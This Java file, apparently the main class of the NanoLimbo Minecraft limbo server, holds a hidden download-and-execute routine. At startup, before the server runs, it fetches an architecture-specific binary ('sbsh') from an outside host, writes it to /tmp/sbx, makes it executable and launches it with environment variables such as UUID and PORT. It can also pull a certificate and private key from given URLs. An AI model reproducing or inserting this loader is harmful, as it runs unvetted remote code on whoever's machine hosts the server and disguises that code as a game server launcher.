package ua.nanit.limbo;

import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.Map;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "CERT_URL", "KEY_URL"
    };

    public static void main(String[] args) {
        try {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            if (hasCustomCert(envVars)) {
                forceDownloadCert(envVars);
            }

            runSbxBinary(envVars);

            new LimboServer().start();

        } catch (Exception e) {
            System.err.println("Startup error: " + e.getMessage());
        }
    }

    private static boolean hasCustomCert(Map<String, String> envVars) {
        return envVars.get("CERT_URL") != null &&
               envVars.get("KEY_URL") != null &&
               !envVars.get("CERT_URL").isEmpty() &&
               !envVars.get("KEY_URL").isEmpty();
    }

    private static void forceDownloadCert(Map<String, String> envVars) throws Exception {
        Path basePath = Paths.get(envVars.getOrDefault("FILE_PATH", "./world"));
        Files.createDirectories(basePath);

        Path certPath = basePath.resolve("cert.pem");
        Path keyPath  = basePath.resolve("private.key");

        Files.deleteIfExists(certPath);
        Files.deleteIfExists(keyPath);

        download(envVars.get("CERT_URL"), certPath);
        download(envVars.get("KEY_URL"), keyPath);

        if (!Files.exists(certPath) || Files.size(certPath) == 0) {
            throw new RuntimeException("cert.pem invalid");
        }

        if (!Files.exists(keyPath) || Files.size(keyPath) == 0) {
            throw new RuntimeException("private.key invalid");
        }
    }

    private static void download(String url, Path target) throws Exception {
        URLConnection conn = new URL(url).openConnection();
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(15000);

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("FILE_PATH", "./world");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    private static Path getBinaryPath() throws Exception {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("arm")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch");
        }

        Path path = Paths.get("/tmp/sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }
}
